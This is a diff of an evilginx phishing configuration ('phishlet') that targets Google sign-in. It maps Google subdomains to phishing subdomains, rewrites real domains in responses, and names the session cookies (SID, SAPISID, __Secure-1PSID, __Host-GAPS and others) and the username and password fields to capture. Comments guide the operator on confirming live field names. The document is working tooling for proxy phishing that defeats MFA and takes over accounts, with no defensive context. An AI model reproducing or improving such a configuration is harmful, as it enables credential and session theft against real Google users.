@@ -1,42 +1,46 @@
-name: 'gmail-mfa'
-author: '@H3llKa1ser'
-min_ver: '2.4.0'
+name: 'google'
+author: '@h3ll_kaiser'
+min_ver: '3.0.0'
+
+# Proxy hosts: which upstream domains get reverse-proxied and how they map
+# to your phishing subdomains. You MUST verify the live hostnames in the flow.
 proxy_hosts:
-  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: true}
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false}
-  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}
-  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false}
-  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
-  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false}
-  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false}
-  - {phish_sub: 'clients1', orig_sub: 'clients1', domain: 'google.com', session: false, is_landing: false}
-  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false}
+  - {phish_sub: 'accounts',     orig_sub: 'accounts',   domain: 'google.com',   session: true, is_landing: true}
+  - {phish_sub: 'www',          orig_sub: 'www',         domain: 'google.com',   session: false}
+  - {phish_sub: 'ssl',          orig_sub: 'ssl',         domain: 'gstatic.com',  session: false}
+  - {phish_sub: 'apis',         orig_sub: 'apis',        domain: 'google.com',   session: false}
+  - {phish_sub: 'play',         orig_sub: 'play',        domain: 'google.com',   session: false}
+
+# Rewrite occurrences of the real domain in responses to your phishing domain.
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://accounts.{hostname}', mimes: ['text/html', 'application/json']}
+  # NOTE: Google heavily uses JS-built URLs; you'll need additional regex
+  # sub_filters for hardcoded strings in the login JS bundles.
+
+# The cookies you need to capture to replay the session.
 auth_tokens:
   - domain: '.google.com'
-    keys: ['SID', 'SSID', 'HSID', 'APISID', 'SAPISID', 'NID', 'OSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', '__Secure-1PSIDCC', '__Secure-3PSIDCC']
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', 'LSID', '__Host-GAPS']
   - domain: 'accounts.google.com'
-    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER']
-  - domain: 'mail.google.com'
-    keys: ['COMPASS', 'GMAIL_AT']
+    keys: ['__Host-GAPS']
+
+# How evilginx detects credential submission. Param names drift over time —
+# capture a live login in Burp/devtools to confirm the current field names.
 credentials:
   username:
-    key: 'identifier'
+    key: 'identifier'      # was 'Email' / 'identifier' historically
     search: '(.*)'
     type: 'post'
   password:
-    key: 'Passwd'
+    key: 'password'        # was 'Passwd' / 'password'
     search: '(.*)'
     type: 'post'
+
+# Force the auth flow to complete (capture session) when this URL is reached.
+auth_urls:
+  - '/signin/v2/challenge/pwd'
+  - '/CheckCookie'
+
 login:
   domain: 'accounts.google.com'
   path: '/ServiceLogin'
-force_post:
-  - path: '/signin/v2/challenge/password/empty'
-    search:
-      - {key: 'Passwd', search: '.*'}
-    force:
-      - {key: 'Passwd', value: ''}
-    type: 'post'
